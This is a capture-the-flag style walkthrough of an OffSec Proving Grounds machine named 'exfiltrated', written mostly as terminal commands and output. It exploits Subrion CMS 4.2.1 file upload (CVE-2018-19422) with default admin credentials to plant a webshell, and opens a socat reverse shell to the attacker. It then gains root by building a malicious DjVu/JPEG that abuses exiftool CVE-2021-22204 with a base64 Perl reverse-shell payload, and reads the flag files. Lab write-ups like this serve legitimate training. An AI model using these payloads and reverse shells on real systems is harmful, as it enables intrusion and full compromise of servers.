No credentials were provided for this machine

nmap -vvv -T5 -Pn 192.168.164.163 -p- -A -oN nmap.txt

sudo echo "192.168.164.163 exfiltrated.offsec" | sudo tee -a /etc/hosts

http://exfiltrated.offsec/

view-source:http://exfiltrated.offsec/

Powered by Subrion 4.2

https://www.exploit-db.com/exploits/49876

Exploit Title: Subrion CMS 4.2.1 - File Upload Bypass to RCE (Authenticated)

http://exfiltrated.offsec/registration/

Created account practice, practice, practice@practice.com, pass: practice --> 

    Member registered! Thank you!

for arm kali : chromium --proxy-server:127.0.0.1:8080

http://exfiltrated.offsec/panel/

https://www.rapid7.com/db/modules/exploit/multi/http/subrion_cms_file_upload_rce/

https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/subrion_cms_file_upload_rce.rb

OptString.new('USERNAME', [ true, 'Username to authenticate with', 'admin' ]),
OptString.new('PASSWORD', [ true, 'Password to authenticate with', 'admin' ])

https://www.exploit-db.com/exploits/49876

┌──(lepotekil㉿kali)-[~/proving-ground-prac/exfiltrated]
└─$ python3 exploit.py -u http://exfiltrated.offsec/panel/ -l 'admin' -p 'admin'
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 
[+] Trying to connect to: http://exfiltrated.offsec/panel/
[+] Success!
[+] Got CSRF token: c6DAa05kAD3q8MzBqTuQsulm0CVhxsqgsx7wa5IX
[+] Trying to log in...
[+] Login Successful!
[+] Generating random name for Webshell...
[+] Generated webshell name: eklqbbblgptdnkc
[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/eklqbbblgptdnkc.phar 
$ whoami
www-data
$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.170:4444

┌──(lepotekil㉿kali)-[~/proving-ground-prac/exfiltrated]
└─$ socat file:`tty`,raw,echo=0 tcp-listen:4444
www-data@exfiltrated:/var/www/html/subrion/uploads$ export SHELL=bash
www-data@exfiltrated:/var/www/html/subrion/uploads$ export TERM=xterm
www-data@exfiltrated:/var/www/html/subrion/uploads$ stty rows 38 columns 116
www-data@exfiltrated:/var/www/html/subrion$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
#
www-data@exfiltrated:/var/www/html/subrion$ cat /opt/image-exif.sh 
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"

https://vk9-sec.com/exiftool-12-23-arbitrary-code-execution-privilege-escalation-cve-2021-22204/

┌──(lepotekil㉿kali)-[~/proving-ground-prac/exfiltrated]
└─$ nano payload                                                                      
┌──(lepotekil㉿kali)-[~/proving-ground-prac/exfiltrated]
└─$ cat payload 
(metadata "\c${system('id')};")                                                                
┌──(lepotekil㉿kali)-[~/proving-ground-prac/exfiltrated]
└─$ sudo apt -y install djvulibre-bin       
djvulibre-bin is already the newest version (3.5.29-1).
Summary:
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 0                                 
┌──(lepotekil㉿kali)-[~/proving-ground-prac/exfiltrated]
└─$ bzz payload payload.bzz                                                                                                     
┌──(lepotekil㉿kali)-[~/proving-ground-prac/exfiltrated]
└─$ djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz                                                                   
┌──(lepotekil㉿kali)-[~/proving-ground-prac/exfiltrated]
└─$ python3 -m http.server                                          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.164.163 - - [19/Oct/2025 08:08:29] "GET /exploit.djvu HTTP/1.1" 200 -

www-data@exfiltrated:/var/www/html/subrion$ wget http://192.168.45.170:8000/exploit.djvu
--2025-10-19 12:08:38--  http://192.168.45.170:8000/exploit.djvu
Connecting to 192.168.45.170:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 88 [image/vnd.djvu]
Saving to: 'exploit.djvu'

exploit.djvu                 100%[==============================================>]      88  --.-KB/s    in 0s      

2025-10-19 12:08:38 (28.0 MB/s) - 'exploit.djvu' saved [88/88]

www-data@exfiltrated:/var/www/html/subrion$ exiftool exploit.djvu 
uid=33(www-data) gid=33(www-data) groups=33(www-data)                  <---------- exploit works
ExifTool Version Number         : 11.88
File Name                       : exploit.djvu
Directory                       : .
File Size                       : 88 bytes
File Modification Date/Time     : 2025:10:19 12:08:15+00:00
File Access Date/Time           : 2025:10:19 12:08:38+00:00
File Inode Change Date/Time     : 2025:10:19 12:08:38+00:00
File Permissions                : rw-r--r--
File Type                       : DJVU
File Type Extension             : djvu
MIME Type                       : image/vnd.djvu
Image Width                     : 1
Image Height                    : 1
DjVu Version                    : 0.24
Spatial Resolution              : 300
Gamma                           : 2.2
Orientation                     : Horizontal (normal)
Image Size                      : 1x1
Megapixels                      : 0.000001

https://github.com/convisolabs/CVE-2021-22204-exiftool

┌──(lepotekil㉿kali)-[~/proving-ground-prac/exfiltrated/CVE-2021-22204-exiftool]
└─$ nano exploit.py
┌──(lepotekil㉿kali)-[~/proving-ground-prac/exfiltrated/CVE-2021-22204-exiftool]
└─$ cat exploit.py
#!/bin/env python3
import base64
import subprocess
ip = '192.168.45.170'
port = '5555'
payload = b"(metadata \"\c${use MIME::Base64;eval(decode_base64('"
payload = payload + base64.b64encode( f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};".encode() )
payload = payload + b"'))};\")"
payload_file = open('payload', 'w')
payload_file.write(payload.decode('utf-8'))
payload_file.close()
subprocess.run(['bzz', 'payload', 'payload.bzz'])
subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])
subprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif<=exploit.djvu', 'image.jpg'])

┌──(lepotekil㉿kali)-[~/proving-ground-prac/exfiltrated/CVE-2021-22204-exiftool]
└─$ python3 exploit.py        
/home/lepotekil/proving-ground-prac/exfiltrated/CVE-2021-22204-exiftool/exploit.py:9: SyntaxWarning: invalid escape sequence '\c'
  payload = b"(metadata \"\c${use MIME::Base64;eval(decode_base64('"
    1 image files updated
┌──(lepotekil㉿kali)-[~/proving-ground-prac/exfiltrated/CVE-2021-22204-exiftool]
└─$ file image.jpg 
image.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2], progressive, precision 8, 750x467, components 3
┌──(lepotekil㉿kali)-[~/proving-ground-prac/exfiltrated/CVE-2021-22204-exiftool]
└─$ python3 -m http.server                                 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.164.163 - - [19/Oct/2025 08:55:49] "GET /image.jpg HTTP/1.1" 200 -

www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.45.170:8000/image.jpg
--2025-10-19 12:55:49--  http://192.168.45.170:8000/image.jpg
Connecting to 192.168.45.170:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 47573 (46K) [image/jpeg]
Saving to: 'image.jpg'

image.jpg                    100%[==============================================>]  46.46K  --.-KB/s    in 0.06s

┌──(lepotekil㉿kali)-[~/proving-ground-prac/exfiltrated]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.164.163] 47938
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# ls /root      
proof.txt
snap
# cat /root/proof.txt
21443f67c6d37533acca0e8bf4ea3ce9
# ls /home
coaran
# cat /home/coaran/proof.txt
cat: /home/coaran/proof.txt: No such file or directory
# cd /home/coaran
# ls
local.txt
# cat local.txt
f6f4a67a676dd1b8b8acd8a0e35f3389